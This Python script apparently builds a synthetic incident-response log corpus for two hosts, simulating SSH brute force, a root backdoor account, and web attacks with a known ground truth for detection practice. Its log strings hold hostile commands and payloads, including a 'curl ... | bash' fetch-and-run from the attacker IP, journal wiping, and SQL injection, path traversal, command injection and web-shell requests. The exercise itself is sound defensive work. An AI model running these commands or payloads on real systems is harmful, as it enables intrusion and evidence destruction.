#!/usr/bin/env python3
"""
Generate a realistic multi-host log corpus for the DFIR «Расследование»
investigation, laid out per-host so cross-host links can fire.

The scenario (so the output can be judged against a known ground truth):
  Attacker 45.137.21.134 brute-forces SSH on web01 and db01, breaks the
  shared "deploy" account on both (lateral movement / valid-accounts reuse),
  and on web01 creates a persistence account "svc-update". Separately, a
  scanner 185.220.101.47 probes web01 for admin panels (many 404s) and fires
  a handful of SQLi / path-traversal / web-shell requests. Benign internal
  traffic and normal logins are mixed in so false positives are visible.

Writes a tree under the output directory:
  web01/auth.log, web01/nginx-access.log
  db01/auth.log
Everything is plain text, read-only input; nothing here is secret.
"""
import os
import sys
import random
from datetime import datetime, timedelta

OUT = sys.argv[1] if len(sys.argv) > 1 else "incident-corpus"
random.seed(1337)

ATTACKER = "45.137.21.134"
SCANNER = "185.220.101.47"
INTERNAL = ["10.0.3.11", "10.0.3.25", "192.168.1.50"]

MONTH = "Oct"
YEAR = 2026


def syslog_ts(day, h, m, s):
    # BSD syslog: "Oct 14 09:12:01" (day space-padded to width 2).
    return f"{MONTH} {day:2d} {h:02d}:{m:02d}:{s:02d}"


def clf_ts(day, h, m, s):
    return f"{day:02d}/{MONTH}/{YEAR}:{h:02d}:{m:02d}:{s:02d} +0000"


def auth_lines_for_host(host, pid_base, break_account):
    lines = []
    pid = pid_base
    # --- benign baseline: a normal internal login and a cron session ---
    lines.append(
        (13, 7, 2, 11,
         f"{syslog_ts(13,7,2,11)} {host} sshd[{pid}]: Accepted publickey for ubuntu "
         f"from {INTERNAL[0]} port 51002 ssh2: RSA SHA256:abc"))
    pid += 1
    lines.append(
        (13, 7, 17, 1,
         f"{syslog_ts(13,7,17,1)} {host} CRON[{pid}]: pam_unix(cron:session): "
         f"session opened for user root by (uid=0)"))
    pid += 1
    # --- the brute force from the attacker, invalid + real users ---
    users = ["root", "admin", "oracle", "postgres", "test", "deploy",
             "deploy", "ubuntu", "git", "jenkins", "deploy", "www-data",
             "deploy", "backup", "deploy", "ftp", "deploy", "deploy"]
    base_min = 11
    for i, u in enumerate(users):
        sec = (i * 7) % 60
        minute = base_min + (i * 7) // 60
        invalid = u in ("oracle", "postgres", "test", "git", "jenkins", "backup", "ftp")
        who = f"invalid user {u}" if invalid else u
        lines.append(
            (14, 9, minute, sec,
             f"{syslog_ts(14,9,minute,sec)} {host} sshd[{pid}]: Failed password for {who} "
             f"from {ATTACKER} port {40000 + i} ssh2"))
        pid += 1
    # --- the successful break-in on the shared account ---
    lines.append(
        (14, 9, 18, 30,
         f"{syslog_ts(14,9,18,30)} {host} sshd[{pid}]: Accepted password for {break_account} "
         f"from {ATTACKER} port 40099 ssh2"))
    pid += 1
    lines.append(
        (14, 9, 18, 31,
         f"{syslog_ts(14,9,18,31)} {host} sshd[{pid}]: pam_unix(sshd:session): "
         f"session opened for user {break_account} by (uid=0)"))
    pid += 1
    return lines, pid


def write_auth(path, host, pid_base, persistence=False):
    lines, pid = auth_lines_for_host(host, pid_base, "deploy")
    if persistence:
        # Attacker creates a backdoor account after getting in.
        lines.append(
            (14, 9, 26, 3,
             f"{syslog_ts(14,9,26,3)} {host} useradd[{pid}]: new user: name=svc-update, "
             f"UID=0, GID=0, home=/home/svc-update, shell=/bin/bash"))
        pid += 1
        lines.append(
            (14, 9, 26, 4,
             f"{syslog_ts(14,9,26,4)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
             f"USER=root ; COMMAND=/usr/bin/apt-get install netcat"))
        # Attacker fetches and runs a second-stage payload, then wipes journals.
        lines.append(
            (14, 9, 28, 10,
             f"{syslog_ts(14,9,28,10)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
             f"USER=root ; COMMAND=/bin/bash -c curl http://45.137.21.134/s.sh | bash"))
        lines.append(
            (14, 9, 31, 2,
             f"{syslog_ts(14,9,31,2)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
             f"USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s"))
    lines.sort(key=lambda t: (t[0], t[1], t[2], t[3]))
    with open(path, "w") as f:
        for _, _, _, _, text in lines:
            f.write(text + "\n")


def write_nginx(path):
    rows = []
    ua_bot = "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
    ua_real = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
    # Benign internal traffic.
    for i in range(12):
        ip = random.choice(INTERNAL)
        rows.append((14, 8, i, 0,
                     f'{ip} - - [{clf_ts(14,8,i,0)}] "GET /index.html HTTP/1.1" 200 '
                     f'{random.randint(800,4000)} "-" "{ua_real}"'))
    # Scanner: many distinct 404 admin-panel probes (recon).
    probes = ["/admin", "/admin.php", "/wp-login.php", "/phpmyadmin/", "/.env",
              "/.git/config", "/config.php", "/backup.zip", "/server-status",
              "/administrator/", "/manager/html", "/shell.php", "/cgi-bin/",
              "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
              "/wp-admin/", "/.aws/credentials", "/console", "/actuator/env",
              "/xmlrpc.php", "/solr/admin/"]
    for i, p in enumerate(probes):
        rows.append((14, 9, 5, i,
                     f'{SCANNER} - - [{clf_ts(14,9,5,i)}] "GET {p} HTTP/1.1" 404 '
                     f'153 "-" "{ua_bot}"'))
    # Scanner: a handful of real web-attack payloads (URL-encoded, like real logs).
    attacks = [
        '"GET /search?q=1%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 512',
        '"GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1733',
        '"GET /item?id=1%3B%20DROP%20TABLE%20users HTTP/1.1" 500 190',
        '"POST /upload.php HTTP/1.1" 200 42',
        '"GET /tpl?name=%7B%7B7%2A7%7D%7D HTTP/1.1" 200 88',
        '"GET /run?cmd=%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1" 200 241',
        # The attacker uploads a web shell, then uses it — a known shell file
        # name the server actually answers (2xx): a real web-shell hit.
        '"GET /uploads/shell.php?cmd=id HTTP/1.1" 200 57',
    ]
    for i, a in enumerate(attacks):
        rows.append((14, 9, 10, i,
                     f'{SCANNER} - - [{clf_ts(14,9,10,i)}] {a} "-" "{ua_bot}"'))
    rows.sort(key=lambda t: (t[0], t[1], t[2], t[3]))
    with open(path, "w") as f:
        for _, _, _, _, text in rows:
            f.write(text + "\n")


def main():
    for host in ("web01", "db01"):
        os.makedirs(os.path.join(OUT, host), exist_ok=True)
    write_auth(os.path.join(OUT, "web01", "auth.log"), "web01", 2000, persistence=True)
    write_auth(os.path.join(OUT, "db01", "auth.log"), "db01", 3000, persistence=False)
    write_nginx(os.path.join(OUT, "web01", "nginx-access.log"))
    total = 0
    for root, _, files in os.walk(OUT):
        for name in files:
            with open(os.path.join(root, name)) as f:
                total += sum(1 for _ in f)
    print(f"wrote corpus to {OUT}/ ({total} log lines)")


if __name__ == "__main__":
    main()
